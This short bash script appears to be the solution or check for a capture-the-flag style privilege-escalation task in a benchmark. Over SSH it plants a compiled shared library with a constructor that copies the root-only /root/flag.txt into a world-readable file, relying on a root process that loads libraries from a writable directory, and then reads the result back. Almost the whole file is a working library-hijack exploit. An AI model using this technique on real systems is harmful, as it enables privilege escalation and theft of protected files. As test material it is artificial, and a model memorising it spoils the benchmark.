#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat >/tmp/payload.c <<'"'"'EOF'"'"'
#include <fcntl.h>
#include <unistd.h>
__attribute__((constructor)) void init(void) {
  int in = open("/root/flag.txt", O_RDONLY);
  int out = open("/tmp/libflag", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (in >= 0 && out >= 0) {
    char buf[256];
    ssize_t n;
    while ((n = read(in, buf, sizeof buf)) > 0) {
      (void)write(out, buf, (size_t)n);
    }
  }
  if (in >= 0) close(in);
  if (out >= 0) close(out);
}
EOF
gcc -shared -fPIC -o /usr/local/lib/benchhijack/payload.so /tmp/payload.c
for _ in $(seq 1 30); do
  if [ -r /tmp/libflag ]; then
    cat /tmp/libflag
    exit 0
  fi
  sleep 1
done
echo "payload.so was not loaded by root poller" >&2
exit 1
')"
assert_root_output "${out}"
